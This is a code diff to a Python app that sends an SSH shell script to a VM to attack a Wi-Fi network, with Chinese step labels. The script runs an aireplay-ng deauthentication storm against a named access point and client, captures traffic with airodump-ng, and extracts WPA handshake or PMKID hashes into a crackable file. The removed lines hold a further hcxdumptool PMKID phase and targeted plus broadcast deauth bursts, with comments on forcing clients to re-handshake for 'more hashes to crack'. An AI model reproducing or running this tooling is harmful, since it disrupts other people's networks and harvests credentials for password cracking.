@@ -518,11 +518,6 @@ class MacCaptureApp:
             self.logline('[2/5] SSH 進 VM，開抓包 (monitor + airodump + deauth storm %ss) ...' % dur)
             vm_script = (
                 'set +e\n'
-                # shell vars keep the % (bssid, client, dur, ch) order stable
-                'BSSID=%s\n'
-                'CLIENT=%s\n'
-                'DUR=%s\n'
-                'CH=%s\n'
                 'rm -f /tmp/capapp* /tmp/appairodump.log /tmp/appdeauth.log /tmp/airodump.log /tmp/deauth.log 2>/dev/null\n'
                 'rm -f /tmp/capfull* /tmp/captest* /tmp/par* /tmp/fg* /tmp/dbg* /tmp/alone* /tmp/mix* /tmp/fresh* 2>/dev/null\n'
                 'i=0\n'
@@ -535,67 +530,24 @@ class MacCaptureApp:
                 'iw dev wlan0 set type monitor 2>/dev/null\n'
                 'ifconfig wlan0 up 2>&1\n'
                 'sleep 2\n'
-                'pkill -9 -f "airodump-ng|aireplay-ng|hcxdumptool" 2>/dev/null\n'
+                'pkill -9 -f "airodump-ng|aireplay-ng" 2>/dev/null\n'
                 'sleep 1\n'
-                'rm -f /tmp/capapp* /tmp/hcx*.pcapng /tmp/hcx.log 2>/dev/null\n'
-                # PHASE 1: hcxdumptool --active_scan (reliable PMKID capture). The
-                # sticky 32H10F client uses PMKSA caching, so deauthing it makes it
-                # fast-reassociate WITHOUT an EAPOL 4-way. hcxdumptool active-scan
-                # makes the AP answer a probe and re-broadcast its PMKID, which
-                # hcxpcapngtool extracts -- no client needed. Guarded: skipped if
-                # hcxdumptool is not installed in the VM.
-                'HCDUR=$(( DUR * 40 / 100 )); [ $HCDUR -lt 20 ] && HCDUR=20\n'
-                'ADUR=$(( DUR - HCDUR )); [ $ADUR -lt 10 ] && ADUR=10\n'
-                'if command -v hcxdumptool >/dev/null 2>&1; then\n'
-                '  echo "PHASE1: hcxdumptool --active_scan (PMKID) ${HCDUR}s ch $CH"\n'
-                '  timeout $HCDUR hcxdumptool -i wlan0 --active_scan --filtermac=$BSSID -c $CH -o /tmp/hcx.pcapng > /tmp/hcx.log 2>&1; tail -6 /tmp/hcx.log\n'
-                'else\n'
-                '  echo "PHASE1: hcxdumptool not in VM -> airodump only"\n'
-                'fi\n'
-                # deauth: SPACED-OUT bursts (targeted + broadcast, every 45s), NOT a
-                # continuous storm. A continuous storm keeps a "sticky" client
-                # (one that ACKs deauths but backs off for a long time) from ever
-                # reassociating. Spacing the bursts 45s apart gives the client a
-                # real window to reassociate after each burst; the continuous
-                # airodump below then captures the (re)association frame, which
-                # carries the PMKID even when the client uses the PMKSA cache
-                # (no full EAPOL 4-way handshake needed).
-                #
-                # KEY FIX for the sticky 32H9F_5G client (bc:61:93:23:bc:3f) that
-                # ACKs a *targeted* deauth but never reassociates: also send a
-                # *broadcast* deauth from the AP (deauths ALL clients). That drops
-                # the sticky client wholesale -> it does a full (re)auth and emits
-                # a (Re)Assoc frame carrying the PMKID (and any EAPOL handshake).
-                # bg subshell, all fds -> /dev/null so it never holds the SSH pipe;
-                # killed by PID on exit.
-                '( END=$(( $(date +%%s) + ADUR )); while [ $(date +%%s) -lt $END ]; do\n'
-                '  # targeted deauth (AP -> client): make the client think the AP dropped it\n'
-                '  aireplay-ng --deauth 12 --ignore-negative-one -a $BSSID -c $CLIENT wlan0 < /dev/null > /dev/null 2>&1\n'
-                '  # BROADCAST deauth (AP -> all clients): the key fix for "sticky" clients that\n'
-                '  # ACK a targeted deauth but never reassociate. Deauthing the AP wholesale\n'
-                '  # forces the client to do a full (re)auth -> (Re)Assoc frame carries the PMKID\n'
-                '  # (works even with a PMKSA cache) and lets us catch any EAPOL 4-way handshake.\n'
-                '  # Bonus: other clients also re-handshake -> more hashes to crack.\n'
-                '  aireplay-ng --deauth 6 --ignore-negative-one -a $BSSID wlan0 < /dev/null > /dev/null 2>&1\n'
-                '  sleep 45\n'
-                'done ) < /dev/null &\n'
-                'DEAUTH_PID=$!\n'
+                'rm -f /tmp/capapp* 2>/dev/null\n'
+                # deauth storm (bg); all fds -> /dev/null so it never holds the
+                # SSH session pipe; pkill -9 before exit releases it (no hang).
+                'nohup aireplay-ng --deauth 9999 --ignore-negative-one -a %s -c %s wlan0 < /dev/null > /dev/null 2>&1 &\n'
                 'sleep 3\n'
-                # airodump: continuous capture for the duration (foreground).
-                # SIGTERM (timeout) flushes the cap fine once monitor mode is set
-                # correctly. Repeat nruns x 10s.
-                'nruns=$(( ADUR / 10 )); [ $nruns -lt 1 ] && nruns=1; [ $nruns -gt 60 ] && nruns=60\n'
+                # airodump: SIGTERM (timeout) flushes the cap fine once monitor
+                # mode is set correctly (the earlier 0-byte caps were the "Resource
+                # busy" monitor failure, not SIGTERM). Repeat nruns x 10s.
+                'nruns=$((%s / 10)); [ $nruns -lt 1 ] && nruns=1; [ $nruns -gt 30 ] && nruns=30\n'
                 'for i in $(seq 1 $nruns); do\n'
-                '  timeout 10 airodump-ng -w /tmp/capapp -c $CH wlan0 > /dev/null 2>&1\n'
+                '  timeout 10 airodump-ng -w /tmp/capapp -c %s wlan0 > /dev/null 2>&1\n'
                 'done\n'
-                'kill -9 $DEAUTH_PID 2>/dev/null\n'
                 'pkill -9 aireplay-ng 2>/dev/null\n'
                 'echo "CAP_COUNT:"; ls /tmp/capapp-*.cap 2>/dev/null | wc -l\n'
                 'echo "CAP_TOTAL:"; du -sch /tmp/capapp-*.cap 2>/dev/null | tail -1\n'
-                'HFILES=""; [ -f /tmp/hcx.pcapng ] && HFILES="/tmp/hcx.pcapng"\n'
-                'for f in /tmp/capapp-*.cap; do [ -f "$f" ] && HFILES="$HFILES $f"; done\n'
-                'echo "HXCAP_FILES:$HFILES"\n'
-                'hcxpcapngtool -o /tmp/capapp.22000 $HFILES 2>&1 | tail -4\n'
+                'ls /tmp/capapp-*.cap 2>/dev/null | xargs hcxpcapngtool -o /tmp/capapp.22000 2>&1 | tail -3\n'
                 'exec 0</dev/null 2>/dev/null\n'
                 'echo "===HASH==="\n'
                 'cat /tmp/capapp.22000 2>/dev/null\n'
@@ -608,8 +560,7 @@ class MacCaptureApp:
             out = (r.stdout or b'').decode('utf-8', 'replace') + (r.stderr or b'').decode('utf-8', 'replace')
             for line in out.splitlines():
                 if any(k in line for k in ['===HASH===', '===END===', 'WPA', 'PMKID',
-                                           'EAPOL', 'hcxpcapngtool', 'hcxdumptool',
-                                           'PHASE1', 'HXCAP_FILES', 'packets inside',
+                                           'EAPOL', 'hcxpcapngtool', 'packets inside',
                                            'ESSID', 'ioctl', 'Failed', 'CAP_COUNT',
                                            'CAP_TOTAL', 'processed cap files']):
                     self.logline('   ' + line.strip())
